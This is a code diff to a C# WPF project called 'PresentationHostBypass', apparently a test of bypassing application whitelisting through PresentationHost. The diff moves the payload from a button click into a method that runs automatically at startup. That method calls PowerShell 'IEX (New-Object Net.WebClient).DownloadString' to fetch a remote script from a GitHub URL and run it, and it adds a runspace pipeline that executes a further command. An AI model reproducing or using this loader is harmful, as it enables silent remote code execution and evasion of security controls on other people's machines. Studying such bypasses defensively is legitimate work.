@@ -14,6 +14,7 @@ using System.Windows.Media.Imaging;
 using System.Windows.Navigation;
 using System.Windows.Shapes;
 using System.Management.Automation;
+using System.Management.Automation.Runspaces;
 
 namespace PresentationHostBypass
 {
@@ -26,12 +27,23 @@ namespace PresentationHostBypass
         {
             InitializeComponent();
             MessageBox.Show("PresentationHostBypass.");
+            Execute();
         }
-        private void Button_Click(object sender, RoutedEventArgs e)
+        private void Execute()//object sender, RoutedEventArgs e
         {
             PowerShell ps = PowerShell.Create();
             ps.AddCommand("Invoke-Expression");
             ps.AddArgument("IEX (New-Object Net.WebClient).DownloadString('https://github.com/NotSurprised/LoremIpsumDolorSitAmetconsEctetur/raw/master/Payload/WhiteListTestScript.ps1')");
+            ps.Invoke();
+
+            string command = "type PresentationHostBypass. >> ./WLtester.txt";
+            RunspaceConfiguration rspacecfg = RunspaceConfiguration.Create();
+            Runspace rspace = RunspaceFactory.CreateRunspace(rspacecfg);
+            rspace.Open();
+            Pipeline pipeline = rspace.CreatePipeline();
+            pipeline.Commands.AddScript(command);
+            pipeline.InvokeAsync();
+
             MessageBox.Show("PresentationHostExecuteBypass.");
         }
     }
